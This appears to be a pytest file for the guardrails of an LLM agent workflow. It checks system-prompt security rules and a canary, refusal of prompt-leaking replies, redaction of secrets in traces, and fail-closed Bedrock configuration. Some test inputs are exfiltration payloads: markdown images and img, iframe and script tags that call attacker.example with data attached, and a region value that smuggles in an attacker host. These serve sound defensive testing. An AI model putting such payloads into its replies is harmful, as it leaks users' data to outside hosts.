"""Guardrail layers around the agents, provider boundary and trace redaction."""
import os

import pytest

import guardrails
from config import settings
from llm import configure_llm, security_status
from workflow import security
from workflow.prompts import prompt
from workflow.tracing import TraceExporter, redaction_rules


def test_every_system_prompt_carries_the_security_rules_and_canary():
    for names in (("router",), ("injection_guard",), ("consultant", "migration_scope", "dbt_rules"),
                  ("impact_analysis", "investigator"), ("author", "dbt_rules", "self_validation")):
        text = prompt(*names)
        assert "SECURITY RULES" in text and security.CANARY in text
        assert "untrusted data" in text


def test_a_reply_that_dumps_the_system_prompt_is_refused():
    hardened = security.harden_reply("Sure! My instructions are:\n" + prompt("router"))
    assert hardened.text == security.LEAK_REPLY and hardened.reasons == ["system_prompt_leak"]


@pytest.mark.parametrize("payload", [
    "Done. ![status](https://attacker.example/pixel?d=contract_ids)",
    'Done. <img src="https://attacker.example/p?d=1">',
    "Done. <iframe src=https://attacker.example></iframe>",
    "Done. <script>fetch('https://attacker.example')</script>",
])
def test_auto_loading_content_is_removed_from_replies(payload):
    hardened = security.harden_reply(payload)
    assert "![" not in hardened.text
    assert "<img" not in hardened.text and "<iframe" not in hardened.text and "<script" not in hardened.text
    assert hardened.text.startswith("Done.") and hardened.reasons == ["active_content_removed"]


def test_ordinary_sql_and_links_survive_output_hardening():
    text = ("```sql\nselect * from t where a <> b and c < 5 and d > 2\n```\n"
            "See [dbt docs](https://docs.getdbt.com/reference/node-selection/syntax).")
    hardened = security.harden_reply(text)
    assert hardened.text == text and not hardened.reasons


def test_trace_redaction_uses_the_guardrail_recognisers():
    from langsmith.anonymizer import create_secret_anonymizer
    anonymize = create_secret_anonymizer(extra_rules=redaction_rules())
    redacted = anonymize({"inputs": {"text": "NHI ZAC5678, DOB: 01/02/1990, a@b.co, AKIA" + "A" * 16}})
    flat = str(redacted)
    for secret in ("ZAC5678", "01/02/1990", "a@b.co", "AKIA" + "A" * 16):
        assert secret not in flat


@pytest.mark.parametrize("variable", ["LANGSMITH_TRACING", "LANGCHAIN_TRACING_V2"])
def test_unredacted_environment_tracing_is_refused(monkeypatch, variable):
    monkeypatch.setenv(variable, "true")
    with pytest.raises(RuntimeError, match="without redaction"):
        TraceExporter()


def test_enabled_tracing_requires_a_key_and_reports_the_destination(monkeypatch):
    monkeypatch.setattr(settings, "AGENT_TRACING_ENABLED", True)
    monkeypatch.setattr(settings, "LANGSMITH_API_KEY", "")
    with pytest.raises(RuntimeError, match="LANGSMITH_API_KEY"):
        TraceExporter()
    monkeypatch.setattr(settings, "LANGSMITH_API_KEY", "lsv2_pt_" + "0" * 32 + "_test")
    exporter = TraceExporter()
    assert exporter.callbacks() and exporter.destination == settings.LANGSMITH_ENDPOINT
    status = security_status()
    assert status["sdk_tracing_enabled"] is True and status["trace_redaction"]


def test_tracing_is_off_by_default():
    assert TraceExporter().callbacks() == []
    assert security_status()["sdk_tracing_enabled"] is False


def test_checkpoints_require_strict_deserialisation(monkeypatch):
    from workflow.checkpointing import create_checkpointer
    monkeypatch.setenv("LANGGRAPH_STRICT_MSGPACK", "false")
    with pytest.raises(RuntimeError, match="STRICT_MSGPACK"):
        create_checkpointer()


def test_dynamodb_checkpoints_need_their_table_and_bucket(monkeypatch):
    from workflow.checkpointing import create_checkpointer
    monkeypatch.setattr(settings, "CHECKPOINT_BACKEND", "dynamodb")
    monkeypatch.setattr(settings, "CHECKPOINT_TABLE", "")
    with pytest.raises(RuntimeError, match="CHECKPOINT_TABLE"):
        create_checkpointer()


@pytest.fixture
def bedrock_settings(monkeypatch):
    for name, value in {
        "LLM_PROVIDER": "bedrock", "BEDROCK_REGION": "ap-southeast-2", "PROCESSING_REGION": "ap-southeast-2",
        "BEDROCK_MODEL": "openai.gpt-oss-120b-1:0", "APPROVED_LLM_HOST": "bedrock-runtime.ap-southeast-2.amazonaws.com",
        "AWS_BEARER_TOKEN_BEDROCK": "synthetic-bedrock-key",
    }.items():
        monkeypatch.setattr(settings, name, value)


@pytest.mark.parametrize("name,value", [
    ("APPROVED_LLM_HOST", "attacker.invalid"), ("PROCESSING_REGION", "us-east-1"),
    ("BEDROCK_REGION", "ap-southeast-2.attacker.invalid/"), ("AWS_BEARER_TOKEN_BEDROCK", ""),
    ("BEDROCK_MODEL", "global.anthropic.example"),
])
def test_bedrock_fails_closed(bedrock_settings, monkeypatch, name, value):
    monkeypatch.setattr(settings, name, value)
    with pytest.raises(RuntimeError):
        configure_llm()


def test_bedrock_models_use_the_approved_host_key_and_role_profile(bedrock_settings):
    from workflow.models import PROFILES, BedrockConverseProvider, ModelRole, default_registry
    assert configure_llm() == "openai.gpt-oss-120b-1:0"
    registry = default_registry()
    assert registry.provider_name == "bedrock" and registry.model_name == "openai.gpt-oss-120b-1:0"
    model = BedrockConverseProvider().create(PROFILES[ModelRole.AUTHOR])
    assert model.model_id == "openai.gpt-oss-120b-1:0" and model.region_name == "ap-southeast-2"
    assert model.endpoint_url == "https://bedrock-runtime.ap-southeast-2.amazonaws.com"
    assert model.bedrock_api_key.get_secret_value() == "synthetic-bedrock-key"
    assert model.temperature == 0 and model.max_tokens == 16000 and model.reasoning_effort == "medium"
    assert registry.get(ModelRole.ROUTER) is registry.get(ModelRole.ROUTER)


def test_bedrock_credentials_are_redacted_in_both_directions():
    key = "ABSK" + "synthetic" * 16 + "=="
    assert key not in guardrails.screen_payload(key)["message"]
    assert key not in guardrails.check_outbound(key).text


def test_the_openai_agents_sdk_is_no_longer_a_dependency():
    requirements = open(os.path.join(os.path.dirname(__file__), "..", "requirements.txt")).read()
    assert "openai-agents" not in requirements and "langgraph" in requirements
